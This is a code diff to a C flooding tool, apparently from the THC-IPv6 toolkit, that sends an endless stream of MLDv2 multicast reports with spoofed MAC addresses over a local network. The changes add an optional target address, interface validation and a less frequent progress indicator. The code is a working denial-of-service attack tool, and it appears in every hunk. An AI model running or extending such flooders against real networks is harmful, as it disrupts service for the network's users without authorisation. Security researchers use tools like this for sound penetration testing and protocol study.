@@ -14,7 +14,7 @@
 
 void help(char *prg) {
   printf("%s %s (c) 2013 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
-  printf("Syntax: %s interface\n\n", prg);
+  printf("Syntax: %s interface [target]\n\n", prg);
   printf("Flood the local network with MLDv2 reports.\n");
 //  printf("Use -r to use raw mode.\n\n");
   exit(-1);
@@ -31,7 +31,7 @@ int main(int argc, char *argv[]) {
   int rawmode = 0;
   int count = 0;
 
-  if (argc < 2 || argc > 3 || strncmp(argv[1], "-h", 2) == 0)
+  if (argc < 2 || argc > 4 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
 
   if (strcmp(argv[1], "-r") == 0) {
@@ -45,6 +45,15 @@ int main(int argc, char *argv[]) {
   setvbuf(stdout, NULL, _IONBF, 0);
 
   interface = argv[1];
+  if (thc_get_own_mac(interface) == NULL) {
+    fprintf(stderr, "Error: invalid interface %s\n", interface);
+    exit(-1);
+  }
+  if (argc > 2)
+    if ((dst = thc_resolve6(argv[2])) == NULL) {
+      fprintf(stderr, "Error: can not resolve %s\n", argv[2]);
+      exit(-1);
+    }
 
   mac[0] = 0x00;
   mac[1] = 0x18;
@@ -61,7 +70,7 @@ int main(int argc, char *argv[]) {
     memcpy(buf2 + 20 + i * 36, ip6, 16);
   }
 
-  printf("Starting to flood network with MLDv2 reports on %s (Press Control-C to end, a dot is printed for every 100 packet):\n", interface);
+  printf("Starting to flood network with MLDv2 reports on %s (Press Control-C to end, a dot is printed for every 1000 packets):\n", interface);
   while (1) {
 
     for (i = 0; i < 4; i++)
@@ -80,7 +89,7 @@ int main(int argc, char *argv[]) {
     }
     count++;
 
-    if ((pkt = thc_create_ipv6(interface, PREFER_LINK, &pkt_len, ip6, dst, 1, 0, 0, 0, 0)) == NULL)
+    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, ip6, dst, 1, 0, 0, 0, 0)) == NULL)
       return -1;
     if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf, 6) < 0)
       return -1;
@@ -95,7 +104,7 @@ int main(int argc, char *argv[]) {
 
     pkt = thc_destroy_packet(pkt);
 //    usleep(1);
-    if (count % 100 == 0)
+    if (count % 1000 == 0)
       printf(".");
   }
   return 0;
